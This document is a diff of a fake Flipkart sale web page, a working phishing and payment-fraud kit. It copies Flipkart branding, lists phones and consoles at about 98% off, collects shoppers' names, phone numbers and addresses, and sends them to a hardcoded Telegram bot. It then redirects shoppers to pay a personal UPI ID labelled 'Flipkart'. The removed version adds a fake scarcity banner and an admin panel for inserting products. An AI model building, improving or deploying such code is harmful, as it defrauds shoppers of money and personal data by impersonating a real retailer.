@@ -3,180 +3,227 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Flipkart | Big Billion Days 2026</title>
+    <title>Flipkart | Big Billion Days</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/swiper@11/swiper-bundle.min.css" />
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap');
         body { font-family: 'Roboto', sans-serif; background-color: #f1f3f6; margin: 0; user-select: none; }
         .fk-blue { background-color: #2874f0; }
-        .btn-buy { background: #fb641b; color: #fff; }
-        .product-card { background: #fff; border: 0.5px solid #f0f0f0; }
-        .line-clamp { display: -webkit-box; -webkit-line-clamp: 2; -webkit-box-orient: vertical; overflow: hidden; }
-        .img-slider { display: flex; overflow-x: auto; scroll-snap-type: x mandatory; scrollbar-width: none; scroll-behavior: smooth; }
-        .img-slider::-webkit-scrollbar { display: none; }
-        .img-slider img { min-width: 100%; height: 350px; object-fit: contain; scroll-snap-align: start; background: white; }
-        input, textarea { border: 1px solid #dbdbdb; padding: 12px; width: 100%; border-radius: 2px; outline: none; margin-bottom: 10px; }
-        .step-box { background: #fff; margin-bottom: 8px; padding: 15px; }
-        @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.5; } }
-        .animate-pulse-fast { animation: pulse 1s cubic-bezier(0.4, 0, 0.6, 1) infinite; }
+        .btn-orange { background: #fb641b; color: #fff; border-radius: 2px; }
+        .btn-yellow { background: #ff9f00; color: #fff; border-radius: 2px; }
+        .rating-badge { background: #388e3c; color: #fff; padding: 1px 5px; border-radius: 3px; font-weight: 500; font-size: 11px; display: inline-flex; align-items: center; }
+        .input-box { width: 100%; border: 1px solid #d4d4d4; padding: 12px; border-radius: 2px; font-size: 14px; margin-bottom: 12px; outline: none; background: #fff; }
+        .f-assured { height: 16px; margin-left: 5px; }
+        .swiper { width: 100%; height: 350px; background: #fff; }
+        .swiper-slide { display: flex; align-items: center; justify-content: center; }
+        .swiper-slide img { max-height: 90%; max-width: 90%; object-fit: contain; }
+        .cat-scroll::-webkit-scrollbar { display: none; }
     </style>
 </head>
-<body class="pb-16">
+<body>
 
-    <header class="fk-blue p-3 sticky top-0 z-[100] text-white flex justify-between items-center shadow-md">
-        <div class="flex items-center space-x-3">
-            <i class="fa-solid fa-bars text-lg"></i>
-            <div class="flex flex-col">
-                <span class="font-bold italic text-xl leading-none">Flipkart</span>
-                <span class="text-[10px] italic">Plus <span class="text-yellow-400">✦</span></span>
+    <div id="page-home">
+        <header class="fk-blue p-3 sticky top-0 z-[100] text-white flex justify-between items-center shadow-md">
+            <div class="flex items-center space-x-3"><i class="fa-solid fa-bars"></i><span class="font-bold italic text-xl">Flipkart</span></div>
+            <div class="flex space-x-4"><i class="fa-solid fa-magnifying-glass"></i><i class="fa-solid fa-cart-shopping"></i></div>
+        </header>
+
+        <div class="bg-white flex overflow-x-auto p-3 space-x-6 cat-scroll border-b">
+            <div class="text-center flex-shrink-0"><img src="https://rukminim2.flixcart.com/flap/128/128/image/22fddf3c7da4c4f4.png?q=100" class="h-10 mx-auto"><p class="text-[10px] mt-1">Mobiles</p></div>
+            <div class="text-center flex-shrink-0"><img src="https://rukminim2.flixcart.com/flap/128/128/image/ab7e2c021d97a8e2.png?q=100" class="h-10 mx-auto"><p class="text-[10px] mt-1">Electronics</p></div>
+            <div class="text-center flex-shrink-0"><img src="https://rukminim2.flixcart.com/flap/128/128/image/69cff05093166b44.png?q=100" class="h-10 mx-auto"><p class="text-[10px] mt-1">Fashion</p></div>
+            <div class="text-center flex-shrink-0"><img src="https://rukminim2.flixcart.com/flap/128/128/image/0ff097d12f32969b.png?q=100" class="h-10 mx-auto"><p class="text-[10px] mt-1">Appliances</p></div>
+            <div class="text-center flex-shrink-0"><img src="https://rukminim2.flixcart.com/flap/128/128/image/71050627a56b4693.png?q=100" class="h-10 mx-auto"><p class="text-[10px] mt-1">Travel</p></div>
+        </div>
+
+        <div class="bg-white border-b">
+            <img src="https://i.ibb.co/8D0YXrgf/Whats-App-Image-2025-12-30-at-03-02-35-1.jpg" class="w-full">
+        </div>
+        <div class="mt-1">
+            <img src="https://i.ibb.co/7JmfFcB5/Whats-App-Image-2025-12-30-at-03-02-36.jpg" class="w-full">
+        </div>
+
+        <div class="bg-white p-3 mt-1 border-b flex justify-between items-center">
+            <h2 class="font-bold text-gray-800">Deals of the Day</h2>
+            <span class="bg-blue-600 text-white text-[10px] px-2 py-1 rounded">VIEW ALL</span>
+        </div>
+
+        <div id="product-list" class="mt-1 bg-white"></div>
+    </div>
+
+    <div id="page-detail" class="hidden fixed inset-0 bg-white z-[200] overflow-y-auto pb-20">
+        <nav class="p-3 border-b sticky top-0 bg-white z-[210] flex items-center justify-between shadow-sm">
+            <i class="fa-solid fa-arrow-left text-xl text-gray-700" onclick="showPage('page-home')"></i>
+            <img src="https://static-assets-web.flixcart.com/fk-p-linchpin-web/fk-cp-zion/img/flipkart-plus_8d85f4.png" class="h-4">
+            <div class="flex space-x-4"><i class="fa-solid fa-heart text-gray-400"></i><i class="fa-solid fa-cart-shopping text-gray-500"></i></div>
+        </nav>
+        
+        <div class="swiper mySwiper">
+            <div class="swiper-wrapper" id="det-images"></div>
+            <div class="swiper-pagination"></div>
+        </div>
+
+        <div class="p-4 border-b">
+            <h1 id="det-title" class="text-sm text-gray-800 leading-tight"></h1>
+            <div class="flex items-center mt-2 space-x-2">
+                <div class="rating-badge" id="det-rate"></div>
+                <span class="text-xs text-gray-400" id="det-rev"></span>
+                <img src="https://static-assets-web.flixcart.com/fk-p-linchpin-web/fk-cp-zion/img/fa_62673a.png" class="f-assured">
+            </div>
+            <div class="flex items-center space-x-2 mt-2">
+                <span class="text-2xl font-bold text-gray-900" id="det-price"></span>
+                <span class="text-gray-400 line-through text-sm" id="det-mrp"></span>
+                <span class="text-green-600 font-bold text-sm">98% off</span>
             </div>
         </div>
-        <div class="flex space-x-5 text-lg">
-            <i class="fa-solid fa-magnifying-glass"></i>
-            <i class="fa-solid fa-cart-shopping"></i>
-            <button onclick="openAdmin()" class="bg-white text-[#2874f0] text-[10px] px-2 py-0.5 font-bold rounded-sm uppercase">Admin</button>
+
+        <div class="p-4 bg-white mt-2 border-b">
+            <h3 class="font-bold text-gray-800 mb-3">Customer Reviews</h3>
+            <div class="border-t pt-3">
+                <div class="flex items-center space-x-2"><span class="bg-green-700 text-white text-[10px] px-1 rounded">5 ★</span><span class="font-bold text-xs">Super!</span></div>
+                <p class="text-xs text-gray-600 mt-1">Excellent product, delivery was very fast. Value for money!</p>
+                <div class="flex mt-2 space-x-2">
+                    <img src="https://rukminim2.flixcart.com/blobio/140/140/imr-202409/blobio-imr-202409_46328766100548f0803517c527f54c93.jpg?q=90" class="w-12 h-12 rounded border">
+                </div>
+            </div>
         </div>
-    </header>
 
-    <div id="storeFront" class="grid grid-cols-2"></div>
-
-    <div id="detailPage" class="hidden fixed inset-0 bg-white z-[200] overflow-y-auto pb-20">
-        <nav class="p-3 border-b flex items-center sticky top-0 bg-white z-[210]">
-            <i class="fa-solid fa-arrow-left text-xl mr-5" onclick="closeDetail()"></i>
-            <span class="font-medium truncate" id="navTitle">Product Details</span>
-        </nav>
-        <div id="detailBody"></div>
-        <div class="fixed bottom-0 w-full h-14 flex z-[220] shadow-2xl">
-            <button class="flex-1 bg-white text-black font-bold uppercase text-sm border-t">Add to Cart</button>
-            <button onclick="openCheckout()" class="flex-1 btn-buy text-white font-bold uppercase text-sm">Buy Now</button>
+        <div class="fixed bottom-0 w-full flex border-t z-[220] bg-white h-14">
+            <button class="w-1/2 font-bold uppercase text-sm border-r text-black bg-white">Add to Cart</button>
+            <button onclick="showPage('page-address')" class="w-1/2 btn-yellow font-bold uppercase text-sm">Buy Now</button>
         </div>
     </div>
 
-    <div id="checkoutPage" class="hidden fixed inset-0 bg-[#f1f3f6] z-[300] overflow-y-auto">
-        <nav class="fk-blue p-3 text-white flex items-center">
-            <i class="fa-solid fa-arrow-left text-xl mr-5" onclick="closeCheckout()"></i>
-            <span class="font-medium">Order Summary</span>
-        </nav>
-        <div class="step-box flex items-center text-gray-500 text-xs font-bold uppercase mt-2">
-            <span class="bg-gray-100 px-2 py-1 mr-2 text-blue-600">1</span> Delivery Details
-        </div>
-        <div class="bg-white px-4 pb-4">
-            <input type="text" id="custName" placeholder="Full Name">
-            <input type="number" id="custPhone" placeholder="Mobile Number">
-            <textarea id="custAddr" placeholder="Full Address (House No, Area, Pincode)" rows="2"></textarea>
-        </div>
-        <div class="p-3 fixed bottom-0 w-full bg-white border-t flex justify-between items-center">
-            <div class="text-lg font-bold" id="finalAmt">₹0</div>
-            <button onclick="processOrder()" class="btn-buy px-10 py-3 font-bold uppercase rounded-sm">Confirm Order</button>
+    <div id="page-address" class="hidden fixed inset-0 bg-white z-[300] overflow-y-auto">
+        <nav class="p-3 border-b flex items-center bg-white sticky top-0 shadow-sm"><i class="fa-solid fa-arrow-left text-xl mr-5" onclick="showPage('page-detail')"></i><span class="font-medium">Add Delivery Address</span></nav>
+        <div class="p-4">
+            <input type="text" id="in-name" placeholder="Full Name*" class="input-box">
+            <input type="number" id="in-phone" placeholder="Mobile Number*" class="input-box">
+            <input type="number" id="in-pin" placeholder="Pincode*" class="input-box" oninput="autoFill(this.value)">
+            <input type="text" id="in-city" placeholder="City*" class="input-box">
+            <input type="text" id="in-state" placeholder="State*" class="input-box">
+            <input type="text" id="in-house" placeholder="House No., Building Name*" class="input-box">
+            <input type="text" id="in-road" placeholder="Road name, Area, Colony*" class="input-box">
+            <button onclick="saveAddress()" class="w-full btn-orange py-4 font-bold uppercase mt-2">Save and Continue</button>
         </div>
     </div>
 
-    <div id="adminPanel" class="hidden fixed inset-0 bg-white z-[500] p-5 overflow-y-auto">
-        <h2 class="text-xl font-bold border-b pb-3 mb-4 flex justify-between">Admin <span onclick="closeAdmin()" class="text-gray-400">&times;</span></h2>
-        <input type="password" id="adminKey" placeholder="Key (947228)">
-        <input type="text" id="pName" placeholder="Product Title">
-        <input type="number" id="pPrice" placeholder="Sale Price">
-        <input type="number" id="pMRP" placeholder="MRP">
-        <textarea id="pImgs" placeholder="Image URLs (comma separated)" rows="3"></textarea>
-        <textarea id="pDesc" placeholder="Features..." rows="2"></textarea>
-        <button onclick="addNewProduct()" class="w-full fk-blue text-white py-4 font-bold rounded uppercase">Update Store</button>
+    <div id="page-summary" class="hidden fixed inset-0 bg-[#f1f3f6] z-[400] overflow-y-auto pb-24">
+        <div class="fk-blue p-8 text-white rounded-b-3xl text-center">
+            <h2 class="text-xl font-bold">Review Your Order</h2>
+            <p class="text-xs opacity-70">100% Safe Payments</p>
+        </div>
+        <div class="bg-white p-4 mx-3 -mt-6 rounded-lg shadow-md">
+            <p id="sum-name" class="font-bold text-sm text-gray-800"></p>
+            <p id="sum-addr" class="text-xs text-gray-500 mt-1"></p>
+        </div>
+        <div class="bg-white p-4 m-3 rounded-lg flex shadow-sm border">
+            <img id="sum-img" class="h-20 w-20 object-contain mr-4 border p-1 rounded">
+            <div class="flex-1">
+                <p id="sum-title" class="text-xs font-medium text-gray-700"></p>
+                <p class="font-bold text-lg mt-2 text-gray-900" id="sum-price"></p>
+                <p class="text-[10px] text-green-700 font-bold">FREE DELIVERY</p>
+            </div>
+        </div>
+        <div class="fixed bottom-0 w-full p-4 bg-white border-t flex justify-between items-center z-[500]">
+            <div id="sum-final" class="text-xl font-bold"></div>
+            <button onclick="finalPay()" class="btn-orange px-12 py-3.5 font-bold uppercase text-sm shadow-md">Continue</button>
+        </div>
     </div>
 
+    <script src="https://cdn.jsdelivr.net/npm/swiper@11/swiper-bundle.min.js"></script>
     <script>
-        const SECRET = "947228";
-        const UPI_ID = "8709615634-w350@ybl";
-        
-        // --- ⚠️ APNI DETAILS YAHAN BHAREIN ⚠️ ---
         const BOT_TOKEN = "8327016009:AAH1igUPnQsuURjtmxxHqaAWTKS-haiO7jM"; 
         const CHAT_ID = "1981500395";
-        // ----------------------------------------
+        const UPI_ID = "8709615634-w350@ybl";
 
-        let products = JSON.parse(localStorage.getItem('fk_v200_data')) || [];
-        
-        function generateData() {
-            const items = [
-                { name: "iPhone 16 Pro Max (Desert Titanium)", price: 1440, mrp: 159900, imgs: "https://rukminim2.flixcart.com/image/312/312/xif0q/mobile/b/f/5/-original-imahggexm5yafhez.jpeg?q=70,https://rukminim2.flixcart.com/image/128/128/xif0q/mobile/s/4/b/-original-imahggex8m6jhazj.jpeg?q=70" },
-                { name: "Samsung Galaxy S24 Ultra 5G", price: 1299, mrp: 134999, imgs: "https://rukminim2.flixcart.com/image/312/312/xif0q/mobile/j/m/z/-original-imahgfmxumntk7sy.jpeg?q=70" },
-                { name: "Sony PS5 Console (Slim) 1TB", price: 499, mrp: 54990, imgs: "https://rukminim2.flixcart.com/image/312/312/xif0q/gaming-console/i/v/n/-original-imahy989zrg3crv9.jpeg?q=70" },
-                { name: "Apple Watch Series 10 GPS", price: 440, mrp: 41900, imgs: "https://rukminim2.flixcart.com/image/312/312/xif0q/smartwatch/y/v/k/-original-imah4ayf36unshmg.jpeg?q=70" }
-            ];
-            let list = [];
-            for(let i=0; i<40; i++) { list.push({...items[i % items.length], desc: "Big Billion Sale Special Offer. Free Shipping."}); }
-            return list;
+        let products = [
+            { id: 0, name: "Apple iPhone 16 Pro Max (Desert Titanium, 256 GB)", price: 1440, mrp: 159900, images: ["https://rukminim2.flixcart.com/image/312/312/xif0q/mobile/b/f/5/-original-imahggexm5yafhez.jpeg?q=70", "https://rukminim2.flixcart.com/image/312/312/xif0q/mobile/5/i/7/-original-imahggexvthqz97h.jpeg?q=70"], rating: "4.7", rev: "12,504" },
+            { id: 1, name: "Samsung Galaxy S24 Ultra 5G (Titanium Gray, 512 GB)", price: 1299, mrp: 134999, images: ["https://rukminim2.flixcart.com/image/312/312/xif0q/mobile/j/m/z/-original-imahgfmxumntk7sy.jpeg?q=70"], rating: "4.6", rev: "8,240" },
+            { id: 2, name: "Noise Buds VS104 with 45 Hours Playtime", price: 120, mrp: 2999, images: ["https://rukminim2.flixcart.com/image/612/612/xif0q/headphone/p/v/f/-original-imagp9vsq2zyhuvv.jpeg?q=70"], rating: "4.1", rev: "2,15,402" },
+            { id: 3, name: "Fire-Boltt Phoenix Smartwatch Calling", price: 450, mrp: 12999, images: ["https://rukminim2.flixcart.com/image/612/612/xif0q/smartwatch/t/l/j/-original-imagmtfyrztjymzh.jpeg?q=70"], rating: "4.3", rev: "95,000" },
+            { id: 4, name: "HP Victus Gaming Laptop Intel Core i5", price: 1450, mrp: 78000, images: ["https://rukminim2.flixcart.com/image/312/312/xif0q/computer/n/i/e/15-fa1145tx-gaming-laptop-hp-original-imahy3uxyecafvsq.jpeg?q=70"], rating: "4.4", rev: "12,000" }
+        ];
+
+        let swiperInstance = null;
+
+        function showPage(id) {
+            document.querySelectorAll('[id^="page-"]').forEach(p => p.classList.add('hidden'));
+            document.getElementById(id).classList.remove('hidden');
+            window.scrollTo(0,0);
         }
 
-        function init() { if(products.length === 0) products = generateData(); render(); }
-
-        function render() {
-            document.getElementById('storeFront').innerHTML = products.map((p, i) => `
-                <div class="product-card" onclick="showDetail(${i})">
-                    <div class="h-44 p-4 flex items-center justify-center"><img src="${p.imgs.split(',')[0]}" class="max-h-full"></div>
-                    <div class="p-3">
-                        <h3 class="text-sm line-clamp">${p.name}</h3>
-                        <div class="flex items-center space-x-2 mt-1"><span class="font-bold">₹${Number(p.price).toLocaleString('en-IN')}</span></div>
+        function renderProducts() {
+            document.getElementById('product-list').innerHTML = products.map(p => `
+                <div class="flex p-4 border-b bg-white active:bg-gray-50" onclick="openDetail(${p.id})">
+                    <img src="${p.images[0]}" class="w-24 h-24 object-contain">
+                    <div class="ml-4 flex-1">
+                        <p class="text-sm text-gray-800 line-clamp-2">${p.name}</p>
+                        <div class="flex items-center mt-1"><div class="rating-badge">${p.rating} ★</div><img src="https://static-assets-web.flixcart.com/fk-p-linchpin-web/fk-cp-zion/img/fa_62673a.png" class="f-assured"></div>
+                        <div class="mt-1 font-bold text-lg text-gray-900">₹${p.price.toLocaleString('en-IN')}</div>
+                        <div class="text-xs text-green-600 font-bold">98% Off</div>
                     </div>
                 </div>
             `).join('');
         }
 
-        function showDetail(i) {
-            activeP = products[i];
-            const imgList = activeP.imgs.split(',');
-            document.getElementById('navTitle').innerText = activeP.name;
-            document.getElementById('detailBody').innerHTML = `
-                <div class="relative bg-white border-b"><div class="img-slider">${imgList.map(img => `<img src="${img.trim()}">`).join('')}</div></div>
-                <div class="p-4 bg-white">
-                    <h1 class="text-lg">${activeP.name}</h1>
-                    <div class="flex items-center space-x-3 mt-2"><span class="text-2xl font-bold">₹${activeP.price}</span><span class="text-gray-400 line-through italic">₹${activeP.mrp}</span></div>
-                    <div class="mt-4 bg-red-50 p-3 border border-red-100 rounded text-red-600 font-bold animate-pulse-fast text-xs">🔥 ONLY 2 LEFT IN STOCK!</div>
-                </div>
-            `;
-            document.getElementById('detailPage').classList.remove('hidden');
-        }
-
-        async function processOrder() {
-            const name = document.getElementById('custName').value;
-            const phone = document.getElementById('custPhone').value;
-            const addr = document.getElementById('custAddr').value;
-            if(!name || !phone || !addr) return alert("Details bhariye!");
-
-            const msg = `🚀 *New Order!*\n👤 *Name:* ${name}\n📞 *Phone:* ${phone}\n🏠 *Address:* ${addr}\n🛍️ *Product:* ${activeP.name}\n💰 *Price:* ₹${activeP.price}`;
-
-            try {
-                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                    method: 'POST',
-                    headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({ chat_id: CHAT_ID, text: msg, parse_mode: 'Markdown' })
+        function openDetail(id) {
+            let p = products[id];
+            window.activeP = p;
+            document.getElementById('det-images').innerHTML = p.images.map(img => `<div class="swiper-slide"><img src="${img}"></div>`).join('');
+            
+            if(swiperInstance) swiperInstance.destroy();
+            setTimeout(() => {
+                swiperInstance = new Swiper(".mySwiper", {
+                    pagination: { el: ".swiper-pagination", clickable: true },
+                    autoplay: { delay: 2500, disableOnInteraction: false },
+                    loop: p.images.length > 1
                 });
-            } catch (e) {}
+            }, 100);
 
-            window.location.href = `upi://pay?pa=${UPI_ID}&pn=Flipkart&am=${activeP.price}&cu=INR&tn=Order_Payment`;
+            document.getElementById('det-title').innerText = p.name;
+            document.getElementById('det-rate').innerText = p.rating + " ★";
+            document.getElementById('det-rev').innerText = "(" + p.rev + ")";
+            document.getElementById('det-price').innerText = "₹" + p.price.toLocaleString('en-IN');
+            document.getElementById('det-mrp').innerText = "₹" + p.mrp.toLocaleString('en-IN');
+            showPage('page-detail');
         }
 
-        function openAdmin() { document.getElementById('adminPanel').classList.remove('hidden'); }
-        function closeAdmin() { document.getElementById('adminPanel').classList.add('hidden'); }
-        function closeDetail() { document.getElementById('detailPage').classList.add('hidden'); }
-        function closeCheckout() { document.getElementById('checkoutPage').classList.add('hidden'); }
-        function openCheckout() { 
-            document.getElementById('finalAmt').innerText = "₹" + Number(activeP.price).toLocaleString('en-IN');
-            document.getElementById('checkoutPage').classList.remove('hidden'); 
+        async function autoFill(pin) {
+            if(pin.length === 6) {
+                try {
+                    const res = await fetch(`https://api.postalpincode.in/pincode/${pin}`);
+                    const data = await res.json();
+                    if(data[0].Status === "Success") {
+                        document.getElementById('in-city').value = data[0].PostOffice[0].District;
+                        document.getElementById('in-state').value = data[0].PostOffice[0].State;
+                    }
+                } catch(e){}
+            }
         }
 
-        function addNewProduct() {
-            if(document.getElementById('adminKey').value !== SECRET) return alert("Wrong Key!");
-            products.unshift({
-                name: document.getElementById('pName').value,
-                price: document.getElementById('pPrice').value,
-                mrp: document.getElementById('pMRP').value,
-                imgs: document.getElementById('pImgs').value,
-                desc: document.getElementById('pDesc').value
-            });
-            localStorage.setItem('fk_v200_data', JSON.stringify(products));
-            location.reload();
+        function saveAddress() {
+            const name = document.getElementById('in-name').value;
+            const phone = document.getElementById('in-phone').value;
+            if(!name || !phone) return alert("All fields are required!");
+            document.getElementById('sum-name').innerText = name + " | " + phone;
+            document.getElementById('sum-addr').innerText = document.getElementById('in-house').value + ", " + document.getElementById('in-road').value + ", " + document.getElementById('in-city').value;
+            document.getElementById('sum-img').src = window.activeP.images[0];
+            document.getElementById('sum-title').innerText = window.activeP.name;
+            document.getElementById('sum-price').innerText = "₹" + window.activeP.price.toLocaleString('en-IN');
+            document.getElementById('sum-final').innerText = "₹" + window.activeP.price.toLocaleString('en-IN');
+            showPage('page-summary');
         }
 
-        init();
+        async function finalPay() {
+            const msg = `🚀 *ORDER ALERT*\n👤 Name: ${document.getElementById('in-name').value}\n📞 Mob: ${document.getElementById('in-phone').value}\n📦 Item: ${window.activeP.name}\n💰 Price: ₹${window.activeP.price}`;
+            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({ chat_id: CHAT_ID, text: msg }) });
+            window.location.href = `upi://pay?pa=${UPI_ID}&pn=Flipkart&am=${window.activeP.price}&cu=INR&tn=Order_Final`;
+        }
+
+        renderProducts();
     </script>
 </body>
 </html>
